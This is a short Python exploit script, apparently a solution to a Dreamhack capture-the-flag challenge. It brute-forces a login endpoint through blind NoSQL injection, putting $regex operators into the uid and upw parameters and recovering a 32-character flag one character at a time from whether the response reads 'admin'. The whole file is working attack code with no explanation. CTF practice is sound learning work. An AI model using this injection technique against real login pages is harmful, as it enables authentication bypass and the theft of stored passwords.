import requests, string

requestURL = "http://host1.dreamhack.games:18425"
requestBaseQuery = "login?uid[$regex]=ad*&upw[$regex]=D.{"
payloadInventory = string.digits + string.ascii_letters
finishTrigger = "admin"

flag = ""

# flag has length of 32
for i in range(32):
    for character in payloadInventory:
        response = requests.get(f"{requestURL}/{requestBaseQuery}{flag}{character}")
        print(f"[{i}] trying... now examining {character}.")
        if response.text == "admin":
            flag += character
            print(f"[{i}] found something... CURRENT STATUS : {flag}")
            break

flag = "{" + flag + "}"
print(f"Successfully finished. flag was DH{flag}")